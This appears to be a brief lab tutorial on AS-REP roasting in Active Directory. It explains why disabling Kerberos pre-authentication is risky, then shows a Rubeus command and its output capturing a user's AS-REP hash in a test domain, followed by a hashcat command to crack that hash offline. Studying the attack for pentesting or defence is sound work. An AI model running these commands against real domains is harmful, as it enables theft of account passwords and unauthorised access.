# AS-REP Roasting

If Kerberos Pre-Authentication is enabled, a [Timestamp](https://ldapwiki.com/wiki/Timestamp) will be [encrypted](https://ldapwiki.com/wiki/Encrypted) using the user's [password](https://ldapwiki.com/wiki/Password) [hash](https://ldapwiki.com/wiki/Hash) as an [encryption](https://ldapwiki.com/wiki/Encryption) [key](https://ldapwiki.com/wiki/Key). If the [KDC](https://ldapwiki.com/wiki/KDC) reads a valid time when using the user's password hash, which is available in the [Microsoft Active Directory](https://ldapwiki.com/wiki/Microsoft%20Active%20Directory), to decrypt the [Timestamp](https://ldapwiki.com/wiki/Timestamp), the [KDC](https://ldapwiki.com/wiki/KDC) knows that request isn't a replay of a previous request.

Without Kerberos Pre-Authentication a [malicious](https://ldapwiki.com/wiki/Malicious) [attacker](https://ldapwiki.com/wiki/Attacker) can directly send a dummy request for [authentication](https://ldapwiki.com/wiki/Authentication). The [KDC](https://ldapwiki.com/wiki/KDC) will return an [encrypted](https://ldapwiki.com/wiki/Encrypted) [TGT](https://ldapwiki.com/wiki/TGT) and the [attacker](https://ldapwiki.com/wiki/Attacker) can brute force it offline.

## Generate vulnerability

Activate

![image](https://user-images.githubusercontent.com/13157446/129409430-5b5cc59e-5ed3-4370-b8bf-f1fe1a00ef98.png)

## Exploitation

Run Rubeus

```text
PS C:\Users\thor\Desktop> .\Rubeus.exe asreproast /outfile:hash.txt /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: AS-REP roasting

[*] Target Domain          : valhalla.local

[*] Searching path 'LDAP://odin.valhalla.local/DC=valhalla,DC=local' for AS-REP roastable users
[*] SamAccountName         : roastme
[*] DistinguishedName      : CN=roastme,CN=Users,DC=valhalla,DC=local
[*] Using domain controller: odin.valhalla.local (192.168.200.100)
[*] Building AS-REQ (w/o preauth) for: 'valhalla.local\roastme'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$roastme@valhalla.local:F4871226F4E82B420B51A83FF0ADC8ED$7BA4EC10E4675
      3B204A053744C7B003E5DDBC699CD6B3DB541865246D3E1ED7C798DE2245040824916266EBACF959
      1A663AF9A85129F51474CD250DAF4F290D24DCEAA196CC28B807431D4222EF1CDCBA40835FF6FC1A
      CF607A0291412D4E59E181359B6452AABC55B917C064A38EEDE9FEC825EA1DD72414FAE178691A4C
      541F26822317CB8B894E63581C90DD56A1D38DF0C1809F6A13B4166C4FB04A64C17ECF86D2538AF5
      C3BA2E4EE2D101BAD135EE6B3784DBC36BD94AFCC79E0271F9B84D3E1BA73659202FD15AB9B37EF4
      EEFB4C8318395D9FC80D8F83751030F799419BF16FED209F3BC2CFFB15FB9EBBC6A
```

Crack it

```text
hashcat -m 18200 hash.txt 500.txt --force 
```

